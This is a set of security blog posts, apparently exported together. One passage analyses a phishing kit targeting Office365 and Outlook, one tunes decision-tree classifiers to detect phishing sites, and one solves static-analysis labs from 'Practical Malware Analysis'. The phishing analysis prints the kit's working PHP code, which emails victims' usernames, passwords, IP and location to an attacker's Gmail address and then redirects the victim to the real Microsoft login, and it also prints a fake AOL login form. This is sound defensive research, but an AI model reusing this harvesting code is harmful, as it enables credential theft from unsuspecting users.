email accordingly.\nIn the rest of the code the headers and body of the email are set, then the email is sent using mail(). After that, the user is redirected to a login page of Microsoft: https://login.microsoftonline.com/common/oauth2.\n\u0026lt;?php $from = \u0026#39;Outlook \u0026lt;noreply\u0026gt;\u0026#39;; // To send HTML mail, the Content-type header must be set $headers = \u0026#39;MIME-Version: 1.0\u0026#39; . \u0026#34;\\r\\n\u0026#34;; $headers .= \u0026#39;Content-type: text/html; charset=iso-8859-1\u0026#39; . \u0026#34;\\r\\n\u0026#34;; // Create email headers $headers .= \u0026#39;From: \u0026#39;.$from.\u0026#34;\\r\\n\u0026#34;. \u0026#39;Reply-To: \u0026#39;.$from.\u0026#34;\\r\\n\u0026#34; . \u0026#39;X-Mailer: PHP/\u0026#39; . phpversion(); $headers .= \u0026#34;MIME-Version: 1.0\u0026#34; . \u0026#34;\\r\\n\u0026#34;; $headers .= \u0026#34;Content-Type: text/html; charset=ISO-8859-1\\r\\n\u0026#34;; // More headers $headers .= \u0026#34;Reply-To: \u0026#34;. strip_tags($email) . \u0026#34;\\r\\n\u0026#34;; $message .= \u0026#34;Username/Email -- $email\\n\u0026#34;; $message .= \u0026#34;Password -- $password\\n\u0026#34;; $message .= \u0026#34;IP -- \u0026#34;.$ip.\u0026#34;\\n\u0026#34;; $message .= \u0026#34;Country Detected -- \u0026#34;.$country.\u0026#34;\\n\u0026#34;; $message .= \u0026#34;Region Detected -- \u0026#34;.$region.\u0026#34;\\n\u0026#34;; $message .= \u0026#34;City Detected -- \u0026#34;.$city.\u0026#34;\\n\u0026#34;; $message .= \u0026#34;Date -- \u0026#34;.$adddate.\u0026#34;\\n\u0026#34;; $message .= \u0026#34;Browser Detected -- \u0026#34;.$browser.\u0026#34;\\n\u0026#34;; //send email @mail($admin_email,$subject,$message); header(\u0026#39;Location: https://login.microsoftonline.com/common/oauth2\u0026#39;); Other php files At this point, the workflow of the kit seems clear, however there are two php files that seem unrelated with the rest of the kit, because they are never called or included: outlookcode/email.php and aol.php.\noutlookcode/email.php This file seems to have the same purpose of emailcode/email.php, but is less sophisticated, as it does not contain the switch case to handle multiple phishing pages. Here is the code:\n\u0026lt;?php if(isset($_REQUEST[\u0026#39;submit_btn\u0026#39;])){ $admin_email = \u0026#34;macdon161@gmail.com\u0026#34;; $email = $_REQUEST[\u0026#39;email\u0026#39;]; $password = $_REQUEST[\u0026#39;password\u0026#39;]; // $headers = \u0026#34;From:\u0026#34;.$email; // Always set content-type when sending HTML email $headers = \u0026#34;MIME-Version: 1.0\u0026#34; . \u0026#34;\\r\\n\u0026#34;; $headers .= \u0026#34;Content-type:text/html;charset=UTF-8\u0026#34; . \u0026#34;\\r\\n\u0026#34;; // More headers $headers .= \u0026#39;From:\u0026#39;.$email . \u0026#34;\\r\\n\u0026#34;; $subject = \u0026#39;Recived data\u0026#39;.$email; $headers = \u0026#34;From: \u0026#34; . strip_tags($email) . \u0026#34;\\r\\n\u0026#34;; $headers .= \u0026#34;Reply-To: \u0026#34;. strip_tags($email) . \u0026#34;\\r\\n\u0026#34;; $headers .= \u0026#34;MIME-Version: 1.0\\r\\n\u0026#34;; $headers .= \u0026#34;Content-Type: text/html; charset=ISO-8859-1\\r\\n\u0026#34;; $message = \u0026#39;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026#39;; $message .= \u0026#39;\u0026lt;p\u0026gt;Username: \u0026#39;.$email.\u0026#39;\u0026lt;p\u0026gt;\u0026lt;br\u0026gt;\u0026#39;; $message .= \u0026#39;\u0026lt;p\u0026gt;Password: \u0026#39;.$password.\u0026#39;\u0026lt;p\u0026gt;\u0026lt;br\u0026gt;\u0026#39;; $message .= \u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;; //send email if(mail($admin_email, $subject, $message, $headers )){ header(\u0026#39;Location: https://login.microsoftonline.com/common/oauth2\u0026#39;); } } //if \u0026#34;email\u0026#34; variable is not filled out, display the form Considering that the exfiltration email is included also here, I assume that this is just the code of an old version of the kit that was left in the zip by mistake\u0026hellip; But who knows? 🤷\naol.php If we manually navigate to aol.php with our browser, we see the following:\nScreenshot of aol.php\nIt seems another phishing page, this time for an app which has email capabilities.\nInteracting with the page, we can notice that \u0026lsquo;Forgot Password?\u0026rsquo;, \u0026lsquo;Get a Free Username\u0026rsquo; and \u0026lsquo;Erase Hard Drive Junk Now\u0026rsquo; are not working, and the same applies to the \u0026lsquo;GET THE AOL APP\u0026rsquo; button. In the source code, they all have the href attribute equal to javascript:void(0).\nAOL apps for iPhone and Android\nHere is the form:\n\u0026lt;?php require_once(\u0026#39;emailcode/email.php\u0026#39;) ?\u0026gt; // SKIPPING NOT INTERESTING HTML \u0026lt;form class=\u0026#34;needs-validation\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;\u0026#34; novalidate\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;Email\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;validationCustom01\u0026#34; placeholder=\u0026#34;Email\u0026#34; required\u0026gt; \u0026lt;div class=\u0026#34;invalid-feedback\u0026#34;\u0026gt; Enter Email Address \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;validationCustom02\u0026#34; placeholder=\u0026#34;Password\u0026#34; required\u0026gt; \u0026lt;div class=\u0026#34;invalid-feedback\u0026#34;\u0026gt; Enter Password \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;a href=\u0026#34;javascript:void(0);\u0026#34; class=\u0026#34;forgotBtn\u0026#34;\u0026gt;Forgot Password?\u0026lt;/a\u0026gt; \u0026lt;button class=\u0026#34;btn stepBtn\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Go to step 2\u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;get-user\u0026#34;\u0026gt; \u0026lt;span\u0026gt;\u0026lt;a href=\u0026#34;javascript:void(0);\u0026#34;\u0026gt;Get a Free Username\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;a href=\u0026#34;javascript:void(0);\u0026#34;\u0026gt;Erase Hard Drive Junk Now\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; As for the other phishing pages of the kit, emailcode/email.php is imported also here. However, in this case, the action attribute of the form is empty; thus the php code will not be able to process the credentials of the victims.\nThe file is clear according to VirusTotal:\naol.php on VirusTotal\nWhat about the other files? We can check the VirusTotal detections of all the files using the sha256 hash:\n$ find . -type f | xargs sha256sum e7ed36ceee5450b4243bbc35188afabdfb4280c7c57597001de0ed167299b01b ./js/bootstrap.min.js 2777abe0312e6b49428d5d7f7f42e43af620793f86f823f2e045968afbdddb63 ./images/microbg.jpg 2ebc65a696544b8d69ade5f136250a9548d4badf1b9ad459e63ff68e7a985c69 ./images/mail.png 17f02fdb590800c9a21e2b6166f5f22cc54952d58897f09d8e82bb9195bc2071 ./images/outlook.png 089aa7fa65a4038b4ab9130d083e6bcc24b0e33f5018984ef1463b8516bc7993 ./images/microsoftlogo.png e298d32d99708f56d68ef9cd0c44ec85910a4df7552b5b2041fcaa48d5ee9742 ./images/webmaillogo.png efaccc2b190fcce0f0ab41064d882fb4a701c6aed6b1035595a16138e32a0a50 ./images/officelogo.png 6adc34b6d4d872e313e0857063eac568a489ab092ff0f15834a2559043c9c1e2 ./images/mobile-img.png c86c4a6731077f1994a8caeccb1fc06477ea35a5b6abbb4abde1d06b8ef9ff32 ./images/landing-devices-bg.jpg 4603ea1b2f9df0c9d4f2a253c550ffbaf27ea2cb53ecde4277b2acf9dde33979 ./images/Onedrive-logo.png 1500514adf9e666a3d20530815df881bc94812c6906a53bd4c216d051d18c372 ./images/office.png 7a2c0b0e1e16041b12dd1a7d18438ceb14063c980799baee1d55cb2f04892777 ./images/officebg.jpg 84f1d1ffdc036768ffeba1be92362dcf619e7ce6ec27500ab47844ed24fc4230 ./index.php 0b09beb179bd176c93c443175940777332cf57ac9e4487ea9088ae21e3c6d032 ./microsoft.php 8979f584623e4307a42bd008d755c35456af8cb96bec89dd4fbec47036e20184 ./css/style.css 2c0f3dcfe93d7e380c290fe4ab838ed8cadff1596d62697f5444be460d1f876d ./css/bootstrap.min.css c60bd69cdc08032d32898d4d3f7648a5370f15720b58b51af77a4ecd72799bc3 ./webmail.php e5a35da055cf9b0cf6d4cfbd2d0e8be75ebdc56949740c5e767f12915e6174eb ./office.php 085f5dfb1f89bd983c58e618a95bf7bdaa872bee4a126495ec3e7cf421bb9fc2 ./aol.php 3234d6c03d185864d6537178a4d1e44c5277c9115f11b07f9c5be0517ebc51a7 ./emailcode/email.php d6083dcb3385f93916f63b6e50d28791a51842d38bd507bcad7b731b7b33009d ./outlookcode/email.php Here are the detections of index.php, microsoft.php, office.php and webmail.php on VirusTotal as of today.\nindex.php, microsoft.php, office.php and webmail.php on VirusTotal\nNo matches were found for emailcode/email.php and outlookcode/email.php. All the other files were flagged as \u0026lsquo;Undetected\u0026rsquo; by all the engines on VirusTotal.\nConclusion In this post, we analyzed u.zip, a phishing kit found online which tricks victims into giving their credentials using 3 templates: one for Office365, one for Outlook and one for other email services (with a cPanel theme).\nSchema of the phishing kit\nThe templates redirect the credentials to emailcode/email.php, which tries to gather additional information and writes them into an email, that is sent to the exfiltration email address. At the end of the execution, the victim is redirected to login.microsoftonline.com.\n","permalink":"https://andpalmier.com/posts/phishing-findings-1/","summary":"Analysis of a phishing kit targeting Outlook and Office365 users","title":"Phishing findings, campaign #1: u.zip (Office365/Outlook)"},{"content":" Last week I started hunting and reporting phishing websites on Twitter (follow me here if you are interested). After some digging, I have decided that it would be interesting to use this topic to refresh my memory around the basics of Machine Learning.\nIn this series of posts I am going to use a smaller variant of this dataset to create machine learning models which (hopefully) will be able to identify a phishing website.\nPlease, note that the dataset contains the 10 \u0026lsquo;baseline features\u0026rsquo; that were selected in this study. The list of features and the code of this post in form of Jupyter notebook can be found in this repository on GitHub.\nThis post has been inspired by:\nInDepth: Parameter tuning for Decision Tree Detecting phishing websites using a decision tree A simple but effective decision tree Let\u0026rsquo;s start with importing the libraries and the data. I used a csv version of the dataset, which you can find here.\nimport numpy as np from sklearn import tree # Load the training data from a CSV file training_data = np.genfromtxt(\u0026#39;phishing_smaller.csv\u0026#39;, delimiter=\u0026#39;,\u0026#39;, dtype=np.int32) The csv has 10.000 samples with 11 columns, where the last one is the label of the sample, while the other values are the features.\n# inputs are in all columns except the last one inputs = training_data[:,:-1] # outputs in the last column outputs = training_data[:, -1] We will use StratifiedKFold to keep the frequency of the classes constant during our K-fold cross-validation. The random_state parameter is used for k-fold and the classifier to reproduce the same setup for all the iterations of the model.\nfrom sklearn.model_selection import StratifiedKFold # use 10-fold skf = StratifiedKFold(n_splits=10, random_state=0, shuffle=True) In order to evaluate how good is our classifier, I will use AUC (Area Under Curve), you can find more information about it in this video.\nHere is how to create, train and evaluate our first decision tree:\n# library for evaluating the classifier import sklearn.metrics as metrics # array to store the accuracy during k-fold cross-validation accuracy = np.array([]) # loop with splits for train_index, test_index in skf.split(inputs, outputs): # 9 folds used for training X_train, X_test = inputs[train_index], inputs[test_index] # 1 fold for testing y_train, y_test = outputs[train_index], outputs[test_index] # Create a decision tree classifier classifier = tree.DecisionTreeClassifier(random_state=0) # Train the classifier classifier.fit(X_train, y_train) # Test the classifier predictions = classifier.predict(X_test) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_test, predictions) # calculate classifier accuracy ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) accuracy = np.append(accuracy,ROC_AUC) print(\u0026#34;ROC AUC: \u0026#34;+str(np.mean(accuracy))) \u0026gt; ROC AUC: 0.9182929859719439 Not bad, but can we improve the accuracy of this decision tree with some tuning?\nTuning: criterion and splitter If we take a look at the scikit-learn documentation for the decision tree classifiers, we can see that there are many parameters available. The first two are the criterion and splitter, having both two possible values. The supported criteria are gini (for Gini impurity) and entropy (for information gain); while the supported strategies available for splitting a node are best and random.\nIn total, we have 4 possible combinations: let\u0026rsquo;s try them to check which one performs better.\n# AUC scores for test results = [] # First= gini, best: default classifier first_classifier = tree.DecisionTreeClassifier(random_state=0 \\ ,criterion=\u0026#34;gini\u0026#34;,splitter=\u0026#34;best\u0026#34;) # Second= gini, random second_classifier = tree.DecisionTreeClassifier(random_state=0 \\ ,criterion=\u0026#34;gini\u0026#34;,splitter=\u0026#34;random\u0026#34;) # Third= entropy, best third_classifier = tree.DecisionTreeClassifier(random_state=0 \\ ,criterion=\u0026#34;entropy\u0026#34;,splitter=\u0026#34;best\u0026#34;) # Fourth= entropy, random fourth_classifier = tree.DecisionTreeClassifier(random_state=0 \\ ,criterion=\u0026#34;entropy\u0026#34;,splitter=\u0026#34;random\u0026#34;) # use same folds StratifiedKFold(n_splits=10, random_state=0, shuffle=True) for train_index, test_index in skf.split(inputs, outputs): X_train, X_test = inputs[train_index], inputs[test_index] y_train, y_test = outputs[train_index], outputs[test_index] # Train and test the first classifier first_classifier.fit(X_train, y_train) predictions = first_classifier.predict(X_test) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_test, predictions) # calculate classifier accuracy ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) first_accuracy = np.append(accuracy,ROC_AUC) # Train and test the second classifier second_classifier.fit(X_train, y_train) predictions = second_classifier.predict(X_test) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_test, predictions) # calculate classifier accuracy ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) second_accuracy= np.append(accuracy,ROC_AUC) # Train and test the third classifier third_classifier.fit(X_train, y_train) predictions = third_classifier.predict(X_test) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_test, predictions) # calculate classifier accuracy ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) third_accuracy= np.append(accuracy,ROC_AUC) # Train and test the fourth classifier fourth_classifier.fit(X_train, y_train) predictions = fourth_classifier.predict(X_test) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_test, predictions) # calculate classifier accuracy ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) fourth_accuracy= np.append(accuracy,ROC_AUC) print(\u0026#34;Test AUC for \u0026#39;gini, best\u0026#39;: \u0026#34;,np.mean(first_accuracy)) print(\u0026#34;Test AUC for \u0026#39;gini, random\u0026#39;: \u0026#34;,np.mean(second_accuracy)) print(\u0026#34;Test AUC for \u0026#39;entropy, best\u0026#39;: \u0026#34;,np.mean(third_accuracy)) print(\u0026#34;Test AUC for \u0026#39;entropy, random\u0026#39;: \u0026#34;,np.mean(fourth_accuracy)) \u0026gt; Test AUC for \u0026#39;gini, best\u0026#39;: 0.9186236108580798 \u0026gt; Test AUC for \u0026#39;gini, random\u0026#39;: 0.9185325195846237 \u0026gt; Test AUC for \u0026#39;entropy, best\u0026#39;: 0.9184414283111678 \u0026gt; Test AUC for \u0026#39;entropy, random\u0026#39;: 0.9190781563126251 In this case, the fourth combination of criterion and splitter (criterion=entropy and split=random) seems to increase the performance of the classifier.\nTuning: max depth Another parameter of the decision tree that we can tune is max_depth, which indicates the maximum depth of the tree. By default, this is is set to None, which means that nodes are expanded until all leaves are pure or contain less than min_sample_split samples.\nConsidering that we have 10 parameters, we will test the performances of trees having max_depths between 1 and 10.\n# AUC scores for training and test training_results = [] test_results = [] # use same folds StratifiedKFold(n_splits=10, random_state=0, shuffle=True) # from 1 to 10 max_depths = range(1,11) for i in max_depths: # loop with splits for train_index, test_index in skf.split(inputs, outputs): training_accuracy = np.array([]) test_accuracy = np.array([]) X_train, X_test = inputs[train_index], inputs[test_index] y_train, y_test = outputs[train_index], outputs[test_index] # Create a decision tree classifier classifier = tree.DecisionTreeClassifier(random_state=0,max_depth=i) # Train the classifier classifier.fit(X_train, y_train) # Accuracy of the classifier during training training_predictions = classifier.predict(X_train) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_train, training_predictions) ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) training_accuracy = np.append(training_accuracy,ROC_AUC) # Test the classifier testing_predictions = classifier.predict(X_test) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_test, testing_predictions) # Accuracy of the classifier during test ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) test_accuracy = np.append(test_accuracy,ROC_AUC) # append results for line chart training_results.append(np.mean(training_accuracy)) test_results.append(np.mean(test_accuracy)) In order to visualize the results, let\u0026rsquo;s use matplotlib to draw a line chart.\n# training results in blue line1, = plt.plot(max_depths, training_results, \u0026#39;b\u0026#39;, label=\u0026#39;Train AUC\u0026#39;) # test results in red line2, = plt.plot(max_depths, test_results, \u0026#39;r\u0026#39;, label=\u0026#39;Test AUC\u0026#39;) plt.legend(handler_map={line1: HandlerLine2D(numpoints=2)}) plt.ylabel(\u0026#39;AUC score\u0026#39;) plt.xlabel(\u0026#39;Tree depth\u0026#39;) plt.show() Performance of the model while tuning max_depth\nAs expected, increasing max_depth allows the model to be more specific when predicting the class of the given sample, thus improving the accuracy during training and test.\nTuning: min samples split The next parameter is min_samples_split:\nIf int, it represents the minimum number of samples required to split an internal node. If float, it is considered a fraction and ceil(min_samples_split * len(samples)) are the minimum number of samples for each split. While the default value is 2, we will test the performance of our classifier having min_samples_split between 0.05 and 1.0.\n# AUC scores for training and test training_results = [] test_results = [] # use same folds StratifiedKFold(n_splits=10, random_state=0, shuffle=True) # from 5% to 100% min_samples_splits = np.linspace(0.05, 1.0,20,endpoint=True) for i in min_samples_splits: # loop with splits for train_index, test_index in skf.split(inputs, outputs): training_accuracy = np.array([]) test_accuracy = np.array([]) X_train, X_test = inputs[train_index], inputs[test_index] y_train, y_test = outputs[train_index], outputs[test_index] # Create a decision tree classifier classifier = tree.DecisionTreeClassifier(random_state=0,min_samples_split=i) # Train the classifier classifier.fit(X_train, y_train) # Accuracy of the classifier during training training_predictions = classifier.predict(X_train) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_train, training_predictions) ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) training_accuracy = np.append(training_accuracy,ROC_AUC) # Test the classifier testing_predictions = classifier.predict(X_test) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_test, testing_predictions) # Accuracy of the classifier during test ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) test_accuracy = np.append(test_accuracy,ROC_AUC) # append results for line chart training_results.append(np.mean(training_accuracy)) test_results.append(np.mean(test_accuracy)) Let\u0026rsquo;s use another line chart to visualize the results:\n# plot line chart line1, = plt.plot(min_samples_splits, training_results, \u0026#39;b\u0026#39;, label=\u0026#39;Train AUC\u0026#39;) line2, = plt.plot(min_samples_splits, test_results, \u0026#39;r\u0026#39;, label=\u0026#39;Test AUC\u0026#39;) plt.legend(handler_map={line1: HandlerLine2D(numpoints=2)}) plt.ylabel(\u0026#39;AUC score\u0026#39;) plt.xlabel(\u0026#39;min samples split\u0026#39;) plt.show() Performance of the model while tuning min_samples_split\nWe can clearly see from the chart how increasing min_samples_split results in an underfitting case, where the model is not able to learn from the samples during training.\nTuning: min samples leaf Similarly to the previous parameter, min_samples_leaf can be:\nint, and it is used to specify the minimum number of samples required to be at a leaf node if float, it represents a fraction and ceil(min_samples_leaf * n_samples) are the minimum number of samples for each node By default, the value is set to 1, but we will consider the cases where it goes from 0.05 to 0.5.\n# AUC scores for training and test training_results = [] test_results = [] # from 5% to 50% min_samples_leaves = np.linspace(0.05, 0.5, 10,endpoint=True) for i in min_samples_leaves: StratifiedKFold(n_splits=10, random_state=0, shuffle=True) # loop with splits for train_index, test_index in skf.split(inputs, outputs): training_accuracy = np.array([]) test_accuracy = np.array([]) X_train, X_test = inputs[train_index], inputs[test_index] y_train, y_test = outputs[train_index], outputs[test_index] # Create a decision tree classifier classifier = tree.DecisionTreeClassifier(random_state=0, min_samples_leaf=i) # Train the classifier classifier.fit(X_train, y_train) # Accuracy of the classifier during training training_predictions = classifier.predict(X_train) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_train, training_predictions) ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) training_accuracy = np.append(training_accuracy,ROC_AUC) # Test the classifier testing_predictions = classifier.predict(X_test) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_test, testing_predictions) # Accuracy of the classifier during test ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) test_accuracy = np.append(test_accuracy,ROC_AUC) # append results for line chart training_results.append(np.mean(training_accuracy)) test_results.append(np.mean(test_accuracy)) # plot line chart line1, = plt.plot(min_samples_leaves, training_results, \u0026#39;b\u0026#39;, label=\u0026#39;Train AUC\u0026#39;) line2, = plt.plot(min_samples_leaves, test_results, \u0026#39;r\u0026#39;, label=\u0026#39;Test AUC\u0026#39;) plt.legend(handler_map={line1: HandlerLine2D(numpoints=2)}) plt.ylabel(\u0026#39;AUC score\u0026#39;) plt.xlabel(\u0026#39;min samples leaf\u0026#39;) plt.show() Performance of the model while tuning min_samples_leaf\nWe can see that, similarly to the tuning of min_samples_split, increasing min_samples_leaf cause our model to underfit, drastically affecting the accuracy of the classifier during training and test.\nTuning: max features The last parameter we are going to consider is max_features, which specifies the number of features to consider when looking for the best split.\nIf int, then consider max_features features at each split. If float, is a fraction and int(max_features * n_features) features are considered at each split. By default it is None, and max_features=n_features Considering the number of features of our dataset, we will test measure the precision of classifiers having max_features between 1 and 10.\n# AUC scores for training and test training_results = [] test_results = [] # from 1 to 10 features max_features = list(range(1,len(inputs[0])+1)) for i in max_features: StratifiedKFold(n_splits=10, random_state=0, shuffle=True) # loop with splits for train_index, test_index in skf.split(inputs, outputs): training_accuracy = np.array([]) test_accuracy = np.array([]) X_train, X_test = inputs[train_index], inputs[test_index] y_train, y_test = outputs[train_index], outputs[test_index] # Create a decision tree classifier classifier = tree.DecisionTreeClassifier(random_state=0,max_features=i) # Train the classifier classifier.fit(X_train, y_train) # Accuracy of the classifier during training training_predictions = classifier.predict(X_train) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_train, training_predictions) ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) training_accuracy = np.append(training_accuracy,ROC_AUC) # Accuracy of the classifier during test testing_predictions = classifier.predict(X_test) false_positive_rate, true_positive_rate, thresholds = \\ metrics.roc_curve(y_test, testing_predictions) # calculate classifier accuracy for test ROC_AUC = metrics.auc(false_positive_rate, true_positive_rate) test_accuracy = np.append(test_accuracy,ROC_AUC) # append results for line chart training_results.append(np.mean(training_accuracy)) test_results.append(np.mean(test_accuracy)) # plot line chart line1, = plt.plot(max_features, training_results, \u0026#39;b\u0026#39;, label=\u0026#39;Train AUC\u0026#39;) line2, = plt.plot(max_features, test_results, \u0026#39;r\u0026#39;, label=\u0026#39;Test AUC\u0026#39;) plt.legend(handler_map={line1: HandlerLine2D(numpoints=2)}) plt.ylabel(\u0026#39;AUC score\u0026#39;) plt.xlabel(\u0026#39;max features\u0026#39;) plt.show() Performance of the model while tuning max_features\nWe can see how the accuracy of the model does not seem to improve much when increasing the number of features considered during a split. While this may seem counter-intuitive, the scikit-learn documentation specifies that \u0026lsquo;the search for a split does not stop until at least one valid partition of the node samples is found, even if it requires to effectively inspect more than max_features features.\u0026rsquo;\nConclusion These posts will investigate how tuning some of the available parameters can affect the performance of simple models. In this case, we saw how criterion, splitter, max_depth, min_samples_split, min_samples_leaf and max_features alter the predictions of a decision tree.\nAs pointed out from a friend, this is not the proper way of tuning the parameters of a model: one could extend parameters search by means of the RandomizedSearchCV provided by sklearn.\n","permalink":"https://andpalmier.com/posts/ml-with-phishing-ep1/","summary":"Tuning the Decision Trees algorithm to detect phishing pages","title":"Machine Learning and phishing, pt. 1: Decision Trees"},{"content":" I am trying to acquire some knowledge on malware analysis by using \u0026lsquo;Practical Malware Analysis\u0026rsquo; (by Sikorski, Michael, and Andrew Honig, 2012). I will publish my solutions of the exercises as soon as I complete them; here you can find all the executables for the labs.\nNOTE: I will try to use Linux utilities (such as pev, wrestool and Detect It Easy) instead of the Windows tools which are mentioned in the book.\nThe first chapter was about basic static analysis techniques, you can find some notes about it in this repo.\nLab 1-1 Upload the files to VirusTotal and view the reports. Does either file match any existing antivirus signatures? Uploading the files on VirusTotal, the results are that Lab01-01.dll is flagged as malicious by 34 engines, and Lab01-01.exe by 41. Here are links to the reports for Lab01-01.dll and Lab01-01.exe.\nWhen were these files compiled? I used pev to detect the timestamp of the compilation:\n$ readpe Lab01-01.dll | grep \u0026#34;time stamp\u0026#34; Date/time stamp: 1292775398 (Sun, 19 Dec 2010 16:16:38 UTC) $ readpe Lab01-01.exe | grep \u0026#34;time stamp\u0026#34; Date/time stamp: 1292775379 (Sun, 19 Dec 2010 16:16:19 UTC) Are there any indications that either of these files is packed or obfuscated? If so, what are these indicators? The output of strings on both the files does not include LoadLibrary or GetProcAddress. We can have confirmation that these are not packed by using Detect It Easy:\n$ diec Lab01-01.dll PE: compiler: Microsoft Visual C/C++(6.0)[msvcrt] PE: linker: Microsoft Linker(6.0)[DLL32] $ diec Lab01-01.exe PE: compiler: Microsoft Visual C/C++(6.0)[msvcrt] PE: linker: Microsoft Linker(6.0)[DLL32] If the given file is packed, the diec command would list the packer used in the output.\nDo any imports hint at what this malware does? If so, which imports are they? pev allows us to check the imported functions by using the -i flag, for instance:\n$ readpe -i Lab01-01.dll Imported functions Library Name: KERNEL32.dll Functions Function Hint: 662 Name: Sleep Function Hint: 68 Name: CreateProcessA Function Hint: 63 Name: CreateMutexA Function Hint: 493 Name: OpenMutexA Function Hint: 27 Name: CloseHandle Library Name: WS2_32.dll Functions Function Ordinal: 23 Function Ordinal: 115 Function Ordinal: 11 Function Ordinal: 4 Function Ordinal: 19 Function Ordinal: 22 Function Ordinal: 16 Function Ordinal: 3 Function Ordinal: 116 Function Ordinal: 9 Library Name: MSVCRT.dll Functions Function Hint: 157 Name: _adjust_fdiv Function Hint: 657 Name: malloc Function Hint: 271 Name: _initterm Function Hint: 606 Name: free Function Hint: 704 Name: strncmp In order to make the blog post more readable, I\u0026rsquo;ll summarize the findings and list only the interesting functions.\nLab01–01.exe imports functions from KERNEL32.dll and MSVCRT.dll Lab01–01.dll imports functions from KERNEL32.dll, MSVCRT.dll, and WS2_32.dll KERNEL32.dll contains important functionalities (like access and edit memory and files), thus is a common DLL to import. It is interesting to note the presence of FindFirstFileA and FindNextFileA in Lab01–01.exe, and CreateProcessA in Lab01–01.dll.\nWS2_32.dll is used for network functionalities, but in this case is imported by ordinals, thus we don\u0026rsquo;t have many additional information.\nAre there any other files or host-based indicators that you could look for on infected systems? Using strings on Lab01-01.exe file, we can see some interesting findings, such as:\nkerne132.dll kernel32.dll C:\\windows\\system32\\kerne132.dll Kernel32. Lab01-01.dll C:\\Windows\\System32\\Kernel32.dll WARNING_THIS_WILL_DESTROY_YOUR_MACHINE (my favorite) In particular, we can assume the existence of the file named kerne132.dll (with a 1 instead of an l) for infected machines.\nWhat network-based indicators could be used to find this malware on infected machines? Using strings on Lab01-01.dll, we can see an IP address: 127.26.152.13.\nWhat would you guess is the purpose of these files? Other interesting results running strings are: exec, hello, CreateProcess and sleep; which are names of functions. Based on the findings provided, we can say that these two files may be used to create a backdoor.\nLab 1-2 Upload the Lab01-02.exe file to VirusTotal. Does it match any existing antivirus definitions? The file is considered malicious by 55 engines, here is the report.\nAre there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible. Detect It Easy finds that UPX has been used in this case:\n$ diec Lab01-02.exe PE: packer: UPX(3.04)[NRV,best] PE: compiler: Microsoft Visual C/C++(6.0)[-] PE: linker: Microsoft Linker(6.0)[EXE32,console] We can then proceed to unpack the file with the following command:\n$ upx -d -o Lab01-02_unpacked.exe Lab01-02.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX git-d7ba31+ Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 16384 \u0026lt;- 3072 18.75% win32/pe Lab01-02_unpacked.exe Unpacked 1 file. Do any imports hint at this program’s functionality? If so, which imports are they and what do they tell you? As shown in the previous exercise, we can use readpe -i to check the imported functions. Here are the interesting findings:\nKERNEL32.DLL: SystemTimeToFileTime, GetModuleFileNameA, CreateMutexA, CreateThread and SetWaitableTimer ADVAPI32.DLL: CreateServiceA, StartServiceCtrlDispatcherA and OpenSCManagerA WININET.DLL: InternetOpenUrlA and InternetOpenA In particular, the last DLL file suggests that the file is communicating over the Internet.\nWhat host or network-based indicators could be used to identify this malware on infected machines? Again, strings is our friend: MalService, Malservice, HGL345,http://www.malwareanalysisbook.com and Internet Explorer 8.0. These results are suggesting that the file is creating a service (probably MalService?) and connecting to the URL.\nLab 1-3 Upload the Lab01-03.exe file to VirusTotal. Does it match any existing antivirus definitions? Lab01-03.exe is detected as malicious by 64 engines, here is the report.\nAre there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible. Scanning the file with diec shows that it is packed with FSG 1.0:\n$ diec Lab01-03.exe PE: packer: FSG(1.0)[-] PE: linker: unknown(0.0)[EXE32,console] Unfortunately it is not possible (AFAIK) to unpack it with upx, thus I cannot proceed:\n$ upx -d Lab01-03.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX git-d7ba31+ Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- upx: Lab01-03.exe: NotPackedException: not packed by UPX 